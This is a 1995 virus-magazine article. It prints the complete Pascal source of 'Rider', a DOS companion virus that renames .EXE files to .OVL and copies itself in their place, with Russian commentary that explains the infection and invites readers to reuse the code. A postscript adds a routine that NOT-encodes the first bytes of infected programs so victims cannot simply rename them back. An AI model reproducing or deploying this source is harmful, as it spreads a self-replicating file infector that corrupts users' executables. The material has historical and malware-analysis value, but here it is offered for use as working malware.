{     ▄▄                  █
    ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       XII 1995
    ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
     ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▄▀▀▄ █ 
      █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▄▀▀▄ █
      █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ ▀▄▄▀ █
      ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.
} 
{ Name          Rider  }
{ Version       1.0    }
{ Stealth       No     }
{ Tsr           No     }
{ Danger        0      }
{ Attac speed   Slow   }
{ Effects       No     }
{ Length        4000   }
{ Language      Pascal }
{ BodyStatus    Packed }
{ Packer        Pklite }

(*                     Copyleft (cl) Dirty Nazi                           *)
                           { For free use }


{$M 2048 , 0 , 0}  { Stack 1024b , Low Heap Limit 0b , High Heap Limit 0b }
Uses Dos;
 Const
     Fail   =  'Cannot execute '#13#10'Disk is write-protected';
     Ovr    =  '.OWL';
     Ovl    =  '.OVL';                   { Константы }
     Exe    =  '.EXE';
 Var
   DirInfo     :   SearchRec;
   Sr          :   SearchRec;
   Ch          :   Char;                 { Переменные }
   I           :   Byte;
   OurName     :   PathStr;
   OurProg     :   PathStr;
   Ren         :   File;
   CmdLine     :   ComStr;
   Victim      :   PathStr;
   VictimName  :   PathStr;

 procedure CheckRO;                      { Процедурка для проверки }
  begin                                  { диска на Read Only }

    Assign(Ren , #$FF);
    ReWrite(Ren);
    Erase(Ren);

    If IOResult <> 0 Then
      begin                              { Если нам ставят Read Only, }
        WriteLn(Fail);                   { то мы им вот так отвечаем }
        Halt(5);  { Access denied }
      end;

  end;  { end proc }

 procedure ExecReal;                     { Процедура прогонки оригинала }
  begin
     FindFirst(OurName + Ovl , AnyFile , DirInfo); { Находим оригинал }

      If DosError <> 0 Then            { Если не нашли }
        begin
            WriteLn('Virus RIDER. Let''s go on riding!');
            WriteLn('I beg your pardon, your infected file cannot be executed...');
            Halt(18);       { File not found }
        end;

     Assign(Ren , OurName + Exe);       { Переименовываем нашу программу }
     ReName(Ren , OurName + Ovr);       { в .OWL }
     Assign(Ren , OurName + Ovl);       { а наш "оверлей" в .EXE }
     ReName(Ren , OurName + Exe);

     SwapVectors;                       { И запускаем его }
     Exec(GetEnv('COMSPEC') , '/C ' + OurName + Exe + CmdLine);
     SwapVectors;

     Assign(Ren , OurName + Exe);
     ReName(Ren , OurName + Ovl);       { А теперь возвращаем все на место }
     Assign(Ren , OurName + Ovr);
     ReName(Ren , OurName + Exe);

  end;  { end proc }

 procedure Infect;        { А это страшная процедура -- процедура заражения }
  begin

      Assign(Ren , Victim);
      ReName(Ren , VictimName + Ovl);     { Переименовываем жертву в .OVL }

      SwapVectors;            { Копируем наше тело на место жертвы }
      Exec(GetEnv('COMSPEC') , '/C COPY ' + OurProg + ' ' + Victim + ' >NUL');
      SwapVectors;
                                    { Вот и все }
  end;  { end proc }

 procedure FindFile;                    { Процедура поиска жертвы }
  begin

      FindFirst('*.EXE' , AnyFile , DirInfo);   { в текущем каталоге }
                                                { ищем .EXE файл }
       If DosError = 0 Then                     { и если мы его нашли }
         begin
             Victim:=DirInfo.Name;           { запоминаем имя жертвы }
             VictimName:=Copy(Victim , 1 , Length(Victim) - 4); { запоми- }
                                     { наем имя без расширения }
             FindFirst(VictimName + Ovl , AnyFile , Sr); { Ищем оверлей }
                                  { с тем же именем }

              If DosError <> 0 Then Infect; { И если оверлея нет, то }
                             { совершаем действия, классифицируемые }
                             { Лозинским как "подлые" }

         end;

  end; { end proc }

  procedure Init;                 { Процедура инициализации переменных }
   begin

        CmdLine:='';              { Коммандная строка }

        OurProg:=ParamStr(0);     { Полное имя нашей программы }
        OurName:=Copy(ParamStr(0) , 1 , Length(ParamStr(0)) - 4); { Имя }
                                        { нашей программы БЕЗ расширения }
        For I:=1 To ParamCount Do
          begin
              CmdLine:=ParamStr(I) + ' ';  { Запоминаем параметры }
          end;

   end;  { end proc }

 begin  { * MAIN * }

     If False Then     { А эту табличку мы засовываем в код для тех, кто }
         begin         { распакует наш вирус и начнет в нем копаться }
            WriteLn(#13#10);
            WriteLn(#13#10' ╔══════════════════════════════════════════════════════════════════╗   ');
            WriteLn(#13#10' ║ This is DEMO version of RIDER. Register to get legalized version ║██ ');
            WriteLn(#13#10' ╠══════════════════════════════════════════════════════════════════╣██ ');
            WriteLn(#13#10' ║ Mr. Lozinsky! I"m just a little child! Please don"t kill me!     ║██ ');
            WriteLn(#13#10' ╚══════════════════════════════════════════════════════════════════╝██ ');
            WriteLn(#13#10'   ████████████████████████████████████████████████████████████████████ '#13#10#13#10);
         end;

     Init;            { Инициализируемся }

     CheckRO;         { Проверка на R/O диска }

     FindFile;        { Ищем и заражаем }

     ExecReal;        { Загружаем наш "оверлей" }

 end.   { * Ну вот и все, и нам пора проститься * }

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     Этот нерезидентный .EXE-вирус по моей классификации -- очень
неопасный, а по классификации Данилова даже и не знаю, ибо  вчера
в файле VirList.Web прочитал такую вещь:

ZzTop.340

     Опасный резидентный вирус. В конец  всех открываемых  *.C  и 
*.CPP-файлов дописывает строку "ZZ TOP".

Я бы, например, просто удивился, найдя у себя в конце  *.C  файла
эту фразу, а вот Игорь Данилович считает это офигенной деструкци-
ей. Ну что ж, улыбок ему!

(For dummies only: *.C-файлы -- это исходники, писаные на языке C
то же самое, что файлы *.PAS, *.BAS, *.PRG, *.ASM etc.)

     О вирусе: вирус Rider ("Мандpiвник" по-нашему) написан очень
просто и доступно. Можете юзать исходник. За сеанс работы заража-
ет один *.EXE файл в текущем каталоге. *.COM - файлы не  заражает
не из-за невозможности этого, а из-за моей лени. Может, в  следу-
ющих версиях... Сам процесс заражения тоже весьма  прост:  жертва
переименовывается в файл с расширением .OVL (оверлей то бишь),  а
на его место с помощью командного  процессора копируется вирусный
код. При запуске производится заражение свеженайденного exeшника,
затем .OVL переименовывается в .EXE, а наш код в .OWL  и запуска-
ется на исполнение оригинал. Когда же оригинальчик отработал, со-
вершаем переименование в  обратном  порядке.  С  Read-Only  диска
программа не стартует, а выдаст преинтереснейшую надпись  о  том,
что программа не загрузится, ибо диск is write-protected. Вот та-
кой вот вирус написал Грязный Нацист. Have a nice die!

P.S. В представленном здесь виде вирус легко обезвредить, просто
     переименовав .OVL файл обратно в .EXE. Hо можно использовать 
     простой прием, и чтобы запустить оригинальную программу, 
     придется-таки запускать вирус. Вот этот прием:

 procedure MakeNot; 
  Var 
     Buf10 : Array [1..10] of Byte;
     Cicle : Byte;
     
  begin
       Seek(Prog , 0);
       Reset(Prog);
       BlockRead(Prog , Buf10 , 10);
       For Cicle:=1 To 10 Do Buf10[Cicle]:=Not Buf10[Cicle];
       Seek(Prog , 0);
       BlockWrite(Prog , Buf10 , 10);
       Close(Prog);
   end;

   При использовании этой процедуры надо учитывать, что заражаемая /
   запускаемая на исполнение программа должна быть связана с пере-
   менной Prog типа File, описанной в основном модуле. Суть процеду-
   ры состоит в том, что из заражаемой программы считывается 10 байт
   и кодируется операцией Not. .EXE программа становится неработо-
   способной. Только не забудьте запускать эту процедуру перед 
   прогоном оригинала, а после прогона еще раз. 


                                                  (cl) Dirty Nazi